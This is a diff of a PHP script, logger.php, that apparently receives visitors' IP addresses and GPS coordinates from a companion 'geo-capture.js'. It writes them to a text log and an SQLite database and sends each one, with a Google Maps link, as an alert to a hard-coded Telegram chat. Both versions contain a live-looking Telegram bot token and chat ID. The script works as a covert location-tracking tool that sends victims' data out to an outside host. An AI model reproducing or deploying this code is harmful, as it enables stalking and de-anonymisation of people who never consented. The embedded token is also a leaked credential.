@@ -1,70 +1,75 @@
 <?php
-// logger.php
-// Logs real IP + optional GPS + Telegram alert + saves to log.txt and SQLite
-
-// Setup
-date_default_timezone_set("Asia/Kolkata");
-$db = new SQLite3("log.db");
-$db->exec("CREATE TABLE IF NOT EXISTS logs (
-  id INTEGER PRIMARY KEY AUTOINCREMENT,
-  ip TEXT,
-  latitude TEXT,
-  longitude TEXT,
-  city TEXT,
-  country TEXT,
-  timestamp TEXT
-)");
-
-// Blocklist
-if (file_exists("blocklist.txt")) {
-  $blocklist = file("blocklist.txt", FILE_IGNORE_NEW_LINES);
-  if (in_array($_SERVER['REMOTE_ADDR'], $blocklist)) {
-    http_response_code(403);
-    exit("Access Denied");
-  }
+// Allow GET access for browser testing (only shows message, doesn't log)
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    echo "✅ Logger Active — Send POST requests to log data securely.";
+    exit;
 }
 
-// Get IP
-function getUserIP() {
-  if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
-  if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
-  return $_SERVER['REMOTE_ADDR'];
+// Setup: Telegram, File Paths, DB
+$telegram_token = "7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8";
+$telegram_chat_id = "6602027873";
+$log_txt_file = "log.txt";
+$log_db_file = "log.db";
+
+// Get raw input JSON from geo-capture.js
+$data = json_decode(file_get_contents("php://input"), true);
+
+// Fallback: If not JSON, return error
+if (!$data || !isset($data['ip']) || !isset($data['latitude'])) {
+    http_response_code(400);
+    echo "Invalid data format.";
+    exit;
 }
 
-$ip = getUserIP();
-$latitude = $_POST['lat'] ?? 'N/A';
-$longitude = $_POST['lon'] ?? 'N/A';
-$city = $_POST['city'] ?? 'Unknown';
-$country = $_POST['country'] ?? 'Unknown';
-$timestamp = date("Y-m-d H:i:s");
-$mapLink = "https://www.google.com/maps?q=$latitude,$longitude";
+// Sanitize inputs
+$ip       = filter_var($data['ip'], FILTER_VALIDATE_IP) ?: 'Unknown';
+$lat      = round(floatval($data['latitude']), 6);
+$lon      = round(floatval($data['longitude']), 6);
+$city     = htmlspecialchars($data['city'] ?? 'Unknown');
+$country  = htmlspecialchars($data['country'] ?? 'Unknown');
+$time     = date("Y-m-d H:i:s");
+$map_link = "https://www.google.com/maps?q={$lat},{$lon}";
 
-// Log to SQLite
-$stmt = $db->prepare("INSERT INTO logs (ip, latitude, longitude, city, country, timestamp) VALUES (?, ?, ?, ?, ?, ?)");
-$stmt->bindValue(1, $ip);
-$stmt->bindValue(2, $latitude);
-$stmt->bindValue(3, $longitude);
-$stmt->bindValue(4, $city);
-$stmt->bindValue(5, $country);
-$stmt->bindValue(6, $timestamp);
-$stmt->execute();
+// 📝 Save to log.txt
+$log_line = "IP: $ip | Lat: $lat | Lon: $lon | City: $city | Country: $country | Time: $time | $map_link" . PHP_EOL;
+file_put_contents($log_txt_file, $log_line, FILE_APPEND | LOCK_EX);
 
-// Log to log.txt
-$log = "IP: $ip | Lat: $latitude | Lon: $longitude | City: $city | Country: $country | Time: $timestamp\n";
-file_put_contents("log.txt", $log, FILE_APPEND);
+// 🗂️ Save to log.db (SQLite)
+try {
+    $db = new SQLite3($log_db_file);
+    $db->exec("CREATE TABLE IF NOT EXISTS logs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        ip TEXT,
+        latitude REAL,
+        longitude REAL,
+        city TEXT,
+        country TEXT,
+        timestamp TEXT
+    )");
+    $stmt = $db->prepare("INSERT INTO logs (ip, latitude, longitude, city, country, timestamp) 
+                          VALUES (:ip, :lat, :lon, :city, :country, :time)");
+    $stmt->bindValue(':ip', $ip);
+    $stmt->bindValue(':lat', $lat);
+    $stmt->bindValue(':lon', $lon);
+    $stmt->bindValue(':city', $city);
+    $stmt->bindValue(':country', $country);
+    $stmt->bindValue(':time', $time);
+    $stmt->execute();
+} catch (Exception $e) {
+    file_put_contents("error_log.txt", "DB Error: " . $e->getMessage() . PHP_EOL, FILE_APPEND);
+}
 
-// Telegram Notification
-$token = "7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8";
-$chat_id = "6602027873";
-$msg = "🚨 New Visitor:
-IP: $ip
-City: $city
-Country: $country
-Lat: $latitude
-Lon: $longitude
-Time: $timestamp
-$mapLink";
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg));
+// 🔔 Telegram alert
+$telegram_msg = "📍 New Visitor Logged\n"
+              . "🌐 IP: $ip\n"
+              . "📍 Location: $city, $country\n"
+              . "🕒 Time: $time\n"
+              . "📌 $map_link";
 
-echo "Logged.";
-?>
+file_get_contents("https://api.telegram.org/bot$telegram_token/sendMessage?" . http_build_query([
+    'chat_id' => $telegram_chat_id,
+    'text'    => $telegram_msg
+]));
+
+// ✅ Final success response
+echo "Logged successfully.";
